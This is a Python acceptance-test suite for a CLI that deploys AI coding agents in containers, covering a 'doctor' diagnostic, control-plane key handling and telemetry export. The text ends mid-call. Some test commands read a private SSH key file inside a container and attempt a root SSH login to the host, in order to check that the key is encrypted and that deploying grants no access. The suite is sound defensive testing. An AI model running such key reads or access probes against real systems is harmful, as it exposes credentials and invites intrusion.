    """T005, THE GATE — S1/C1/FR-002/SC-002.

    Runs over a project with real problems AND a deployed environment, so the checks
    have something to look at; a gate exercised only against an empty project proves
    almost nothing.
    """
    proj = acc.tmp / "docproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdoc1\n    host: local\n"
        "    container:\n      agent: claude\n"
        "    credentials:\n"
        "      - { name: gone, source: file, path: /nonexistent/key }\n"
    )
    (proj / ".agent-container" / "accdoc1.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@e.com\n"
    )
    acc.up("accdoc1")  # a real container, so the port and host checks do real work

    before = _doctor_snapshot(acc)
    r = _doctor(acc, cwd=proj)
    after = _doctor_snapshot(acc)
    assert before == after, (
        "doctor mutated observable state — the one thing FR-002 forbids:\n"
        + "\n".join(f"  {ln}" for ln in set(after) ^ set(before))
    )
    assert r.returncode in (0, 1), r.stderr  # never 2: doctor itself ran fine


def test_doctor_changes_nothing_on_a_PRE_011_project(acc):
    """T006 — the path where a deploy calls `migrate_flat_state()`, which relocates
    files, is idempotent, and documents itself as "safe to call repeatedly". It is the
    only deploy-path helper that looks harmless, which is what makes it the trap."""
    proj = acc.tmp / "olddoc"
    proj.mkdir(parents=True, exist_ok=True)
    (proj / "agent-container.accdoc2.env").write_text("GH_TOKEN=x\n")
    (proj / "agent-container.accdoc2.anthropic.key").write_text("sk-ant-OLD\n")

    before = _doctor_snapshot(acc)
    before_proj = sorted(p.name for p in proj.iterdir())
    r = _doctor(acc, "accdoc2", cwd=proj)
    assert _doctor_snapshot(acc) == before
    assert sorted(p.name for p in proj.iterdir()) == before_proj, "the project tree moved"
    assert r.returncode in (0, 1), r.stderr


def test_doctor_reports_ALL_problems_in_one_pass(acc):
    """T014 — S2/C2/FR-003/SC-001. Three independent problems, one run. Not the first,
    and not one per run."""
    proj = acc.tmp / "multiproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdoc3\n    host: local\n"
        "    container:\n      agent: claude\n"
        "    credentials:\n"
        "      - { name: gone, source: file, path: /nonexistent/key }\n"
        "      - { name: unset, source: env, var: ACC_DOCTOR_NEVER_SET }\n"
        "      - { name: nomgr, source: command, argv: [definitely-not-installed-xyz, get] }\n"
    )
    r = _doctor(acc, "--json", cwd=proj)
    payload = json.loads(r.stdout)["data"]
    observed = " ".join(f["observed"] for f in payload["findings"])
    assert "/nonexistent/key" in observed
    assert "ACC_DOCTOR_NEVER_SET" in observed
    assert "definitely-not-installed-xyz" in observed
    assert r.returncode == 1  # blocking failures present


def test_every_doctor_finding_names_a_remedy(acc):
    """T015 — S3/C3/SC-003: zero findings that state only a symptom."""
    proj = acc.tmp / "remproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdoc4\n    host: local\n"
        "    container:\n      agent: claude\n"
        "    credentials:\n      - { name: gone, source: file, path: /nope/key }\n"
    )
    payload = json.loads(_doctor(acc, "--json", cwd=proj).stdout)["data"]
    assert payload["findings"], "nothing to assert against"
    assert all(f["remedy"].strip() for f in payload["findings"])


def test_the_layout_remedy_is_the_deploys_OWN_STRING(acc):
    """T016 — S4/C4/SC-008. Byte identity, not a substring match: two strings that
    agree today drift the moment one is edited, and both still read correctly alone."""
    proj = acc.tmp / "layoutproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdoc5\n    host: local\n    container:\n      agent: claude\n"
    )
    (proj / "agent-container.accdoc5.env").write_text("GH_TOKEN=x\n")  # pre-011 offender

    payload = json.loads(_doctor(acc, "accdoc5", "--json", cwd=proj).stdout)["data"]
    layout = [f for f in payload["findings"] if f["check_id"] == "layout"]
    assert layout, f"no layout finding: {payload['findings']}"
    doctor_remedy = layout[0]["remedy"]

    deploy = acc.cli(["up", "accdoc5"], cwd=proj)
    assert deploy.returncode != 0
    # The deploy's refusal must CONTAIN doctor's remedy verbatim.
    assert doctor_remedy.splitlines()[0] in deploy.stderr, (
        f"doctor and the deploy diverged.\ndoctor: {doctor_remedy[:200]}\n"
        f"deploy: {deploy.stderr[:400]}"
    )


def test_doctor_outside_a_project_SUCCEEDS(acc):
    """T034 — S11/C11/FR-007. US3's whole scenario is a new machine, before any
    project exists; failing here would make the command useless in the case it exists
    for."""
    outside = acc.tmp / "notaproject"
    outside.mkdir(parents=True, exist_ok=True)
    r = _doctor(acc, "--json", cwd=outside)
    payload = json.loads(r.stdout)["data"]
    assert payload["scope"] == "machine"
    assert r.returncode == 0, r.stderr
    plain = _doctor(acc, cwd=outside)
    assert "no project found" in plain.stderr


def test_doctor_never_exceeds_exit_2(acc):
    """T027 — S7/SC-004a/R4. `3` is *pending registration* tool-wide."""
    proj = acc.tmp / "codeproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdoc6\n    host: local\n"
        "    container:\n      agent: claude\n"
        "    credentials:\n      - { name: gone, source: file, path: /nope/k }\n"
    )
    for args in ([], ["accdoc6"], ["--json"], ["no-such-env"]):
        rc = _doctor(acc, *args, cwd=proj).returncode
        assert rc <= 2, f"doctor {args} exited {rc}"


def test_a_healthy_doctor_run_is_BRIEF(acc):
    """T028 — S14/C16/FR-014/SC-007. The threshold is a number because "one screen" is
    unfalsifiable and screen height is not a property of the tool."""
    proj = acc.tmp / "briefproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdoc7\n    host: local\n    container:\n      agent: claude\n"
    )
    (proj / ".agent-container" / "accdoc7.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@e.com\n"
    )
    r = _doctor(acc, "accdoc7", cwd=proj)
    lines = [ln for ln in (r.stdout + r.stderr).splitlines() if ln.strip()]
    limit = _load_cli().DOCTOR_BRIEF_LINES
    assert len(lines) <= limit, f"{len(lines)} lines > {limit}:\n" + "\n".join(lines)
    # And --json still carries every check, passes included.
    payload = json.loads(_doctor(acc, "accdoc7", "--json", cwd=proj).stdout)["data"]
    assert any(c["status"] == "pass" for c in payload["checks"])


def test_doctor_leaks_no_credential_VALUE(acc):
    """T050 — S9/C9/FR-010/SC-006, against a real file's contents."""
    secret = "sk-ant-ACCEPTANCE-DOCTOR-MUST-NOT-PRINT"
    keyfile = acc.tmp / "doctor.key"
    keyfile.write_text(secret + "\n")
    proj = acc.tmp / "leakproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdoc8\n    host: local\n"
        "    container:\n      agent: claude\n"
        f"    credentials:\n      - {{ name: k, source: file, path: {keyfile} }}\n"
    )
    r = _doctor(acc, "--json", cwd=proj)
    assert secret not in r.stdout and secret not in r.stderr
    plain = _doctor(acc, cwd=proj)
    assert secret not in plain.stdout and secret not in plain.stderr


def test_the_image_stamp_is_real_and_freshness_passes_after_a_build(acc, _image):
    """T047 — S12/C13/FR-012a. The `_image` fixture already built with the current CLI,
    so the label must be present and the check must pass."""
    label = subprocess.run(
        [RUNTIME, "image", "inspect", _image, "--format",
         '{{index .Config.Labels "org.opencontainers.image.version"}}'],
        capture_output=True, text=True,
    ).stdout.strip()  # fmt: skip
    assert label, "the image carries no version stamp"
    assert not label.endswith("+unknown"), f"a sentinel was stamped: {label}"
    payload = json.loads(_doctor(acc, "--json").stdout)["data"]
    fresh = [c for c in payload["checks"] if c["id"] == "image-freshness"]
    assert fresh and fresh[0]["status"] == "pass", fresh


def test_doctor_lists_EVERY_host_individually(acc):
    """T035 — S10/C10/C12/FR-008/SC-005. One unreachable host must not suppress the
    others, and must never be silently absent — absent reads as "fine"."""
    # TWO hosts, deliberately: registering one makes it the default, so a single-host
    # version cannot tell "reported both" from "reported the only one there is". The
    # first run of this test failed for exactly that reason — the dead host WAS
    # reported correctly, and the assertion was wrong.
    live = acc.cli(
        ["host", "add", "accdoclive", "--driver", RUNTIME,
         "--docker-context", "default", "--default"]
    )  # fmt: skip
    assert live.returncode == 0, live.stderr
    dead = acc.cli(
        ["host", "add", "accdocdead", "--driver", "docker", "--docker-context", "nope-xyz"]
    )
    assert dead.returncode == 0, dead.stderr

    payload = json.loads(_doctor(acc, "--json").stdout)["data"]
    hosts = [c for c in payload["checks"] if c["id"] == "host-reachability"]
    named = {c["finding"]["entity"] for c in hosts if c["finding"]}
    assert len(hosts) >= 2, f"only {len(hosts)} host checks: {hosts}"
    # The unreachable one must be NAMED. Silence would read as health.
    assert "accdocdead" in named, f"the unreachable host is absent from the report: {hosts}"
    bad = [c for c in hosts if c["finding"] and c["finding"]["entity"] == "accdocdead"]
    assert bad[0]["status"] != "pass", bad[0]


def test_an_unroutable_host_is_never_reported_as_PASS(acc):
    """T049 — S5/C5. The scenario the feature exists to get right: a diagnostic
    reporting healthy is what stops an operator looking further."""
    r = acc.cli(
        ["host", "add", "accdocunroutable", "--driver", "docker",
         "--docker-context", "ssh://root@10.255.255.1"]
    )  # fmt: skip
    assert r.returncode == 0, r.stderr
    payload = json.loads(_doctor(acc, "--json").stdout)["data"]
    hosts = [
        c
        for c in payload["checks"]
        if c["id"] == "host-reachability"
        and c["finding"]
        and c["finding"]["entity"] == "accdocunroutable"
    ]
    assert hosts, "the unroutable host was not reported"
    assert hosts[0]["status"] in ("fail", "unknown"), hosts[0]
    assert hosts[0]["status"] != "pass"


def test_a_running_environments_own_port_is_not_a_conflict(acc):
    """T051 — S13/C14/R10, against a really-deployed container. The port derives from
    the name, so a running environment always holds "its" port — reporting that as a
    conflict would fail `doctor` on every healthy deployment."""
    proj = acc.tmp / "portproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdocport\n    host: local\n    container:\n      agent: claude\n"
    )
    (proj / ".agent-container" / "accdocport.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@e.com\n"
    )
    acc.up("accdocport")
    payload = json.loads(_doctor(acc, "accdocport", "--json", cwd=proj).stdout)["data"]
    port = [c for c in payload["checks"] if c["id"] == "port-availability"]
    assert port and port[0]["status"] == "pass", port


def test_advisory_only_exits_zero_and_chains(acc):
    """T025 — S6/C6/C7/FR-011/SC-004. `doctor && up` must stay viable, or the command
    stops being run — which is the reasoning the spec's own exit-status clarification
    rests on."""
    proj = acc.tmp / "advproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdocadv\n    host: local\n    container:\n      agent: claude\n"
    )
    (proj / ".agent-container" / "accdocadv.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@e.com\n"
    )
    clean = _doctor(acc, "accdocadv", "--json", cwd=proj)
    payload = json.loads(clean.stdout)["data"]
    blocking = [
        c for c in payload["checks"] if c["status"] == "fail" and c["severity"] == "blocking"
    ]
    assert not blocking, f"expected no blocking failures: {blocking}"
    assert clean.returncode == 0, clean.stderr

    # Now a blocking problem in the same project: exit must become 1.
    (proj / "agent-container.accdocadv.env").write_text("GH_TOKEN=x\n")  # pre-011 offender
    assert _doctor(acc, "accdocadv", cwd=proj).returncode == 1


def test_doctor_never_INVOKES_a_credential_resolver(acc):
    """T053a — S8/C8/FR-009, automated rather than watched.

    The original scenario asked a human to declare a 1Password credential against an
    approval-gated item and confirm no system dialog appeared. That needs a manager
    installed, and it makes the operator's screen the instrument.

    But the property is not "no dialog appeared" — it is **the resolver was never
    invoked**. A `command` source pointing at a script that records its own execution
    proves exactly that, deterministically, on any machine, with nothing installed.
    A dialog is merely one consequence of the invocation this asserts cannot happen.
    """
    marker = acc.tmp / "resolver-ran.marker"
    script = acc.tmp / "fake-resolver.sh"
    script.write_text(f"#!/bin/sh\ntouch {marker}\necho secret-value\n")
    script.chmod(0o755)

    proj = acc.tmp / "promptproj"
    (proj / ".agent-container").mkdir(parents=True, exist_ok=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: accdocprompt\n    host: local\n"
        "    container:\n      agent: claude\n"
        "    credentials:\n"
        f"      - {{ name: gated, source: command, argv: [{script}] }}\n"
    )

    r = _doctor(acc, "--json", cwd=proj)
    assert not marker.exists(), (
        "doctor RAN the credential resolver — for a real manager that is the prompt "
        "FR-009 forbids, and it pulls a secret into memory against FR-010"
    )
    # ...and it still said something useful about the credential rather than skipping it.
    payload = json.loads(r.stdout)["data"]
    cred = [
        c
        for c in payload["checks"]
        if c["id"] == "credentials" and c["finding"] and "gated" in (c["finding"]["entity"] or "")
    ]
    assert cred and cred[0]["status"] == "unknown", cred
    assert "NOT verified" in cred[0]["finding"]["observed"]
    assert "secret-value" not in r.stdout and "secret-value" not in r.stderr


# =============================================================================
# Feature 017 — the control plane, and the dual-stack observability it widened to
# =============================================================================
#
# What is here is what a real container shows and a function call cannot: an
# ABSENCE (a passphrase that exists nowhere, an image with no agents, a deploy
# that granted nothing), a REFUSING collector, a SIGKILL, and a trail that
# survives the destruction of the host that produced it.


def test_the_control_plane_image_has_NO_AGENT_on_path(_control_plane_image):
    """S9 / SC-009 / C12 — checked on the BUILT image, not the Dockerfile.

    The source census is a different claim: it says no `npm i -g` line installs
    an agent. This says no agent BINARY is reachable, which also covers one
    arriving through a base image, a transitive install, or a hand-edited layer.
    Keep both — neither implies the other.
    """
    for agent_bin in ("claude", "codex", "pi", "opencode", "npm", "node"):
        r = subprocess.run(
            [RUNTIME, "run", "--rm", "--entrypoint", "sh", _control_plane_image,
             "-c", f"command -v {agent_bin} || echo ABSENT"],
            capture_output=True, text=True, timeout=120,
        )  # fmt: skip
        assert "ABSENT" in r.stdout, (
            f"{agent_bin} is on PATH in the control-plane image — FR-015a wants "
            f"'no agents here' to be a property of the artifact"
        )


def test_the_control_plane_image_HAS_the_cli(_control_plane_image):
    """The converse of the test above, and it has to be here: an image that
    installed nothing at all would pass every absence check."""
    r = subprocess.run(
        [RUNTIME, "run", "--rm", "--entrypoint", "sh", _control_plane_image,
         "-c", "command -v agent-container && agent-container --help >/dev/null && echo OK"],
        capture_output=True, text=True, timeout=180,
    )  # fmt: skip
    assert "OK" in r.stdout, (
        f"the CLI is not usable in the control-plane image:\n{r.stderr[-2000:]}"
    )


def test_THE_GATE_the_passphrase_exists_NOWHERE(acc, _control_plane_image, tmp_path):
    """T012 / S4 / C4 — the feature's load-bearing absence.

    Greps for THE ACTUAL PRINTED VALUE, not for the shape of the print statement.
    Asserting the code looks right proves nothing about where the value went, and
    an absence is exactly what working output never demonstrates.

    Everything the tool can write is searched: state, config, the durable data
    store, the container's own log, and a `list --json` payload.
    """
    out = acc.up_raw("hub", role="control-plane")
    passphrase = _extract_passphrase(out.stdout + out.stderr)
    assert passphrase, (
        "no passphrase was printed on the boot that created the key — the operator "
        f"has an encrypted key they cannot unlock:\n{out.stdout[-2000:]}\n{out.stderr[-2000:]}"
    )
    assert len(passphrase) >= 16, f"passphrase is implausibly short: {len(passphrase)} chars"

    # 1. Nothing the tool wrote on this machine.
    for root in (acc.state_dir, acc.work):
        for path in root.rglob("*"):
            if not path.is_file():
                continue
            try:
                body = path.read_text(errors="replace")
            except OSError:
                continue
            assert passphrase not in body, f"the passphrase is in {path}"

    # 2. Not in the container's log. The entrypoint prints it to stdout ONCE and
    #    the tool consumes it; a `log()` call would make it durable where nothing
    #    rotates it. This is the one place it legitimately transits, so what is
    #    asserted is that it appears at most in the block the tool parses — never
    #    in a log line of its own.
    logs = subprocess.run(
        [RUNTIME, "logs", "agent-container-hub"], capture_output=True, text=True, timeout=120
    )
    log_body = logs.stdout + logs.stderr
    for line in log_body.splitlines():
        if passphrase in line:
            assert line.strip() == passphrase, (
                f"the passphrase appears in a log LINE rather than alone in the "
                f"sentinel block: {line[:120]!r}"
            )

    # 3. Not in any --json payload.
    #
    # RETURNCODE ASSERTED FIRST. The first version of this step double-prepended
    # the CLI argv, so the command failed with a usage error and the absence
    # assertion passed against that — a vacuous pass on the feature's
    # load-bearing absence. An absence check must prove the thing that would
    # contain the value actually ran.
    r = acc.cli(["list", "--json"])
    assert r.returncode == 0, (
        f"`list --json` did not run, so its absence proves nothing:\n{r.stderr}"
    )
    assert '"containers"' in r.stdout, f"`list --json` produced no listing: {r.stdout[:300]}"
    assert passphrase not in r.stdout, "the passphrase is in `list --json`"

    # 4. Not in any run record the tool ingested.
    for path in _runs_store_of(acc.state_dir).rglob("*.json"):
        if path.is_file():
            assert passphrase not in path.read_text(errors="replace"), f"passphrase in {path}"


def test_the_passphrase_is_printed_ONCE_not_on_every_boot(acc, _control_plane_image):
    """R3: it crosses the tool on the boot that CREATES the key.

    A second print would mean either the key was regenerated — invalidating every
    authorisation the operator made — or the value was stored somewhere to be
    re-printed, which is the thing that must not exist.
    """
    first = acc.up_raw("hub2", role="control-plane")
    assert _extract_passphrase(first.stdout + first.stderr)
    acc.cli(["stop", "hub2"])
    second = acc.cli(["start", "hub2"])
    assert not _extract_passphrase(second.stdout + second.stderr), (
        "a passphrase was printed on a restart — either the key was regenerated or "
        "the value is being stored somewhere"
    )


def test_the_private_key_is_ENCRYPTED_at_rest_and_0600(acc, _control_plane_image):
    """T025 / S3 / SC-008. An unencrypted key on this volume means possessing the
    volume is possessing the fleet."""
    acc.up("hub3", role="control-plane")
    r = subprocess.run(
        [RUNTIME, "exec", "agent-container-hub3", "sh", "-c",
         "stat -c %a /home/dev/.ssh/id_ed25519; head -c 200 /home/dev/.ssh/id_ed25519"],
        capture_output=True, text=True, timeout=120,
    )  # fmt: skip
    assert r.returncode == 0, r.stderr
    mode, _, body = r.stdout.partition("\n")
    assert mode.strip() == "600", f"the control-plane key is mode {mode.strip()}, not 600"
    # An OpenSSH key encrypted with a passphrase does NOT say "none" for its
    # cipher. Checked by attempting a passphrase-free read, which is the
    # behavioural test rather than a guess about the header.
    probe = subprocess.run(
        [RUNTIME, "exec", "agent-container-hub3", "sh", "-c",
         "ssh-keygen -y -P '' -f /home/dev/.ssh/id_ed25519 >/dev/null 2>&1 && echo UNENCRYPTED || echo ENCRYPTED"],
        capture_output=True, text=True, timeout=120,
    )  # fmt: skip
    assert "ENCRYPTED" in probe.stdout, (
        "the control-plane private key can be read with an EMPTY passphrase — it is "
        "not encrypted at rest, and the volume alone is then the whole fleet"
    )


def test_no_PRIVATE_KEY_reaches_the_operators_disk(acc, _control_plane_image):
    """SC-008: only public halves leave. Walks the whole state + config tree with
    no exclusions — the carve-outs 018 needed are gone."""
    acc.up("hub4", role="control-plane")
    for root in (acc.state_dir, acc.work):
        for path in root.rglob("*"):
            if path.is_file():
                body = path.read_text(errors="replace")
                assert "PRIVATE KEY" not in body, f"a private key reached {path}"


def test_deploying_a_control_plane_GRANTS_NOTHING(acc, _control_plane_image):
    """T024 / S6 / C6 / FR-007b — the quiet load-bearer.

    If deploying granted anything, nesting and revocation both stop meaning what
    the spec says: a nested control plane would inherit reach, and revoking a key
    would not be the boundary.

    Measured by asking the container to reach a host it was never authorised on.
    """
    port = acc.up("hub5", role="control-plane")
    # The container holds a key nobody authorised. An SSH attempt to the host must
    # fail on authentication, not succeed.
    r = subprocess.run(
        [RUNTIME, "exec", "agent-container-hub5", "sh", "-c",
         "ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no "
         "root@host.docker.internal true 2>&1; echo EXIT=$?"],
        capture_output=True, text=True, timeout=120,
    )  # fmt: skip
    assert "EXIT=0" not in r.stdout, (
        "a freshly deployed control plane authenticated somewhere without its key "
        "being authorised — deployment granted reach, which breaks FR-007b"
    )
    assert port > 0


# THE IN-CONTAINER CLI IS THE LAST RELEASED ONE, NOT THIS WORKING TREE.
#
# The control-plane image installs `agent_container` from PyPI at a pinned version
# (research R1), because the build context is one image directory by construction
# and the checkout is not reachable from it. So the CLI inside the container is
# whatever was last PUBLISHED — and an acceptance test of in-container behaviour
# therefore measures the released CLI, not the code under test.
#
# That is a chicken-and-egg for any feature still in development: the first run of
# this test failed with `{'form': 'destroy', 'results': [], 'excluded': 0}` — an
# envelope with no `self_excluded` key at all, exactly what an older CLI emits.
# The property was correct and the test was measuring the wrong binary.
#
# So tests that exercise UNRELEASED in-container behaviour mount the working-tree
# CLI over the installed one. The container already has Python 3.14 and the four
# runtime dependencies (they are `agent_container`'s own), so the single-file
# script runs directly.
# `--mount` takes a DIRECTORY, not a file — the CLI refuses a file path outright,
# which is how the first version of these tests failed ("host path ... does not
# exist or is not a directory"). So the CHECKOUT'S BIN DIRECTORY is mounted and
# the script referenced inside it.
_CLI_MOUNT_DIR = "/mnt/agent-container-src"
_CLI_UNDER_TEST = f"{_CLI_MOUNT_DIR}/{SCRIPT_PATH.name}"


def _cli_mount() -> str:
    return f"{SCRIPT_PATH.parent}:{_CLI_MOUNT_DIR}:ro"


def _exec_working_tree_cli(cname: str, *args: str, env: dict | None = None, timeout: int = 300):
    """Run THIS checkout's CLI inside `cname`.

    Mounting rather than trusting the installed copy, so the test measures the
    code under review. A test that silently exercised the released CLI would pass
    or fail for reasons unrelated to the change in front of you.
    """
    argv = [RUNTIME, "exec"]
    for k, v in (env or {}).items():
        argv += ["-e", f"{k}={v}"]
    argv += [cname, "python3", _CLI_UNDER_TEST, *args]
    return subprocess.run(argv, capture_output=True, text=True, timeout=timeout)


def test_panic_from_inside_EXCLUDES_ITSELF_and_survives(acc, _control_plane_image):
    """T035 / S8 / C9 / SC-010 / SC-006.

    Not to protect the container — to protect the REPORT. `panic`'s whole value is
    telling the truth about what it could not reach, and there is no report at all
    if the reporter is the first casualty.
    """
    acc.up("hub6", role="control-plane", mount=[_cli_mount()])
    acc.up("victim", wait=False, mode="headless", task="sleep 300")
    r = _exec_working_tree_cli(
        "agent-container-hub6",
        "panic", "--destroy", "-y", "--json",
        env={"AGENT_CONTAINER_CONTROL_PLANE_NAME": "hub6"},
    )  # fmt: skip
    assert r.returncode in (0, 1), f"panic did not run inside the container:\n{r.stderr[-2000:]}"
    payload = json.loads(r.stdout)
    data = payload.get("data", payload)
    assert "hub6" in (data.get("self_excluded") or []), (
        f"the control plane did not report itself as excluded: {data}"
    )
    # AND IT IS STILL RUNNING — the report would be undeliverable otherwise.
    alive = subprocess.run(
        [RUNTIME, "inspect", "-f", "{{.State.Running}}", "agent-container-hub6"],
        capture_output=True,
        text=True,
        timeout=60,
    )
    assert alive.stdout.strip() == "true", "the control plane destroyed itself"


# --- Feature 017 dual-stack observability, against a REAL collector ----------


@contextlib.contextmanager
def _collector(mode: str, port: int):
    """A local OTLP receiver, reachable from a container.

    `mode` selects the behaviour under test:
      accept    -> 200 {}
      refuse    -> 200 with partialSuccess.rejectedLogRecords = 1
      transient -> 503

    THE REFUSING MODE IS THE POINT. A compliant collector passes whether or not
    the exporter honours `partial_success`, so only one configured to refuse
    exposes the naive 2xx-means-success implementation (SC-021, S17).

    Bound on 0.0.0.0 so the container reaches it; the port is per-test to keep
    parallel runs from sharing a receiver.
    """
    script = textwrap.dedent(
        f"""
        import http.server, json
        SEEN = []
        class H(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                raw = self.rfile.read(int(self.headers.get("Content-Length", 0)))
                SEEN.append(raw)
                with open({str(_acc_base() / f"collector-{port}.jsonl")!r}, "ab") as fh:
                    fh.write(raw + b"\\n")
                mode = {mode!r}
                if mode == "refuse":
                    body = json.dumps({{"partialSuccess": {{"rejectedLogRecords": 1}}}}).encode()
                    self.send_response(200)
                elif mode == "transient":
                    body = b"busy"; self.send_response(503)
                else:
                    body = b"{{}}"; self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers(); self.wfile.write(body)
            def log_message(self, *a): pass
        http.server.HTTPServer(("0.0.0.0", {port}), H).serve_forever()
        """
    )
    log = _acc_base() / f"collector-{port}.jsonl"
    log.unlink(missing_ok=True)
    proc = subprocess.Popen(
        [sys.executable, "-c", script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    try:
        deadline = time.monotonic() + 15
        while time.monotonic() < deadline:
            with contextlib.suppress(OSError):
                with socket.create_connection(("127.0.0.1", port), timeout=1):
                    break
            time.sleep(0.2)
        else:
            pytest.fail(f"the test collector never bound on {port}")
        yield log
    finally:
        proc.terminate()
        with contextlib.suppress(subprocess.TimeoutExpired):
            proc.wait(timeout=5)


def _collector_run_ids(log: Path) -> list[str]:
    """The run ids a collector received, PARSED rather than pattern-matched.

    The first version regexed the raw payload for an id-shaped string. The record
    travels as an ESCAPED JSON string inside the OTLP body, so `[^"]+` swallowed
    the backslash before the escaped quote and yielded the same id twice — once
    clean, once with a trailing `\\`. That read as a collector holding a record
    the local leg had never accepted, i.e. a phantom divergence, on a system that
    was in fact perfectly consistent.

    It also broke this project's standing rule: never parse a structured format
    with a regex. The ids are read from the resource ATTRIBUTE, which is where
    C18f puts them precisely so they can be found without digging through a body.
    """
    ids: list[str] = []
    for line in log.read_text("utf-8", "replace").splitlines():
        if not line.strip():
            continue
        try:
            doc = json.loads(line)
        except json.JSONDecodeError:
            continue
        for rl in doc.get("resourceLogs") or []:
            for attr in (rl.get("resource") or {}).get("attributes") or []:
                if attr.get("key") == "agent_container.run_id":
                    value = (attr.get("value") or {}).get("stringValue")
                    if value:
                        ids.append(str(value))
    return sorted(set(ids))


def _collector_url(port: int) -> str:
    """A URL for the collector that resolves FROM INSIDE a container.

    `host.docker.internal` on Docker Desktop / Lima; the default gateway
    otherwise. Resolved once here so a failure to reach the collector is a
    harness problem with a name, not an export that silently reads as fail-open —
    which would make every test below pass for the wrong reason.
    """
    return f"http://host.docker.internal:{port}/v1/logs"


def _settings(acc, **keys) -> None:
    """Write the user-level settings the CLI reads (project-level would need a
    project root, and these tests deploy imperatively)."""
    d = _config_dir_of(acc.state_dir)
    d.mkdir(parents=True, exist_ok=True)
    (d / "settings.yaml").write_text(
        "\n".join(f"{k}: {json.dumps(v)}" for k, v in keys.items()) + "\n"
    )


def _headless_run(acc, name: str, marker: str = "hello") -> None:
    """A headless run that ACTUALLY ENDS, using the suite's stand-in agent.

    The first version of these tests passed a shell command as `--task` to the
    real `claude` binary, which is uncredentialed here — so the container never
    exited and seven tests died on a 120s timeout that read like an export
    failure. `foreground=True` then removes the wait entirely: `up` returns when
    the run completes, so there is no race left to poll for.
    """
    ws = _fake_agent(acc, name, f"echo {marker}; exit 0")
    acc.up(
        name,
        mode="headless",
        agent="claude",
        task=marker,
        workspace="bind",
        workspace_dir=ws,
        env_extra=[_FAKE_AGENT_PATH],
        foreground=True,
        wait=False,
    )


def test_a_REFUSING_collector_makes_records_rejected_not_accepted(acc, tmp_path):
    """T052 / SC-021 / S17 — the naive-implementation catcher.

    OTLP's response carries `partialSuccess` with a rejected count, so a receiver
    may return 200 while refusing records. An exporter that treats 2xx as success
    marks refused records as delivered, and the local leg then claims a delivery
    the collector never made. A COMPLIANT collector passes either way, which is
    why this one is configured to refuse.
    """
    with _collector("refuse", 9531):
        _settings(acc, otlp_endpoint=_collector_url(9531))
        _headless_run(acc, "expref")
        acc.cli(["telemetry", "collect"])
        states = _record_states(acc)
    assert states, "no records were collected at all"
    assert "accepted" not in states, (
        f"a refusing collector produced `accepted` records — the exporter is "
        f"treating 2xx as acceptance: {states}"
    )
    assert "rejected" in states, f"expected at least one `rejected` record, got {states}"


def test_export_is_FAIL_OPEN_when_the_collector_is_unreachable(acc):
    """T061 / S14 / C18c. The work must not be blocked by its own observability,
    and the record must survive locally with the gap visible."""
    _settings(acc, otlp_endpoint="http://127.0.0.1:9599/v1/logs")  # nothing listening
    # Fail-open is asserted by the run COMPLETING, which `_headless_run` requires.
    _headless_run(acc, "expopen", "still-works")
    acc.cli(["telemetry", "collect"])
    states = _record_states(acc)
    assert states, "the local record did not survive an unreachable collector"
    # RETRYABLE, not terminal — the collector may simply be back later. This is
    # the `000` http_code case, which a numeric guard alone does not catch.
    assert "failed" in states or "pending" in states, (
        f"an unreachable collector produced a TERMINAL state, so those records "
        f"would never be retried: {states}"
    )
    assert "rejected" not in states, (
        "an unreachable collector was recorded as `rejected` (terminal) — those "
        "records are now permanently discarded"
    )


def test_a_SIGKILL_loses_nothing_that_was_already_written(acc):
    """T057 / SC-022 / C16 — and it must be a KILL, not a graceful stop.

    A graceful stop would pass against an exit-time batch, which is exactly the
    implementation this rejects. Only killing proves the export already happened
    at write time.
    """
    with _collector("accept", 9532) as log:
        _settings(acc, otlp_endpoint=_collector_url(9532))
        acc.up("expkill", role=None)
        # Wait for the START record to have been written and exported.
        _wait_until(lambda: log.exists() and log.stat().st_size > 0, "a record at the collector")
        before = log.read_bytes()
        subprocess.run([RUNTIME, "kill", "-s", "KILL", "agent-container-expkill"],
                       capture_output=True, timeout=120)  # fmt: skip
        time.sleep(2)
        after = log.read_bytes()
    assert before, "nothing reached the collector before the kill"
    # Everything present before the kill is still there: the collector holds it,
    # so the container's death cannot take it.
    assert after.startswith(before), "the collector lost records across the kill"


def test_the_task_marker_is_present_by_default_and_absent_when_excluded(acc):
    """T064 / S13 / SC-017 — BOTH positions, at the receiver.

    A switch verified in one position may not be wired at all.
    """
    marker = "TASKMARKER-9f2b-do-the-thing"
    with _collector("accept", 9533) as log:
        _settings(acc, otlp_endpoint=_collector_url(9533))
        _headless_run(acc, "exptask", marker)
        _wait_until(lambda: log.exists() and marker in log.read_text(errors="replace"),
